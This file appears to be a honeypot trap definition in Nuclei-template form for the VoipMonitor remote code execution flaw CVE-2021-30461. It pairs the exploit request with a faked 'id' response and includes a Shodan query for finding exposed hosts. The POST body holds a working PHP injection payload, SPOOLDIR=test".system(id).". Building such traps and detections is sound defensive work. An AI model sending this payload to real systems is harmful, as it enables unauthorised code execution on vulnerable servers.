id: CVE-2021-30461
info:
  name: VoipMonitor <24.61 - Remote Code Execution
  author: shifacyclewala,hackergautam
  description: 'VoipMonitor prior to 24.61 is susceptible to remote code execution
    vulnerabilities because of its use of user supplied data via its web interface,
    allowing  remote unauthenticated users to trigger a remote PHP code execution
    vulnerability.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  remediation: 'Upgrade VoipMonitor to version 24.61 or later to mitigate this vulnerability.

    '
  reference:
  - https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-30461
  - https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-30461
    cwe-id: CWE-94
    epss-score: 0.96262
    epss-percentile: 0.99416
    cpe: cpe:2.3:a:voipmonitor:voipmonitor:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: voipmonitor
    product: voipmonitor
    shodan-query: http.title:"VoIPmonitor"
  tags: cve2021,cve,rce,voipmonitor
traps:
- request:
    method: POST
    path: /index.php
    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Content-Type: application/x-www-form-urlencoded
    body: 'SPOOLDIR=test".system(id)."&recheck=Recheck

      '
  response:
    status_code: 200
    headers: {}
    body: uid=gid=groups=VoIPmonitor installation
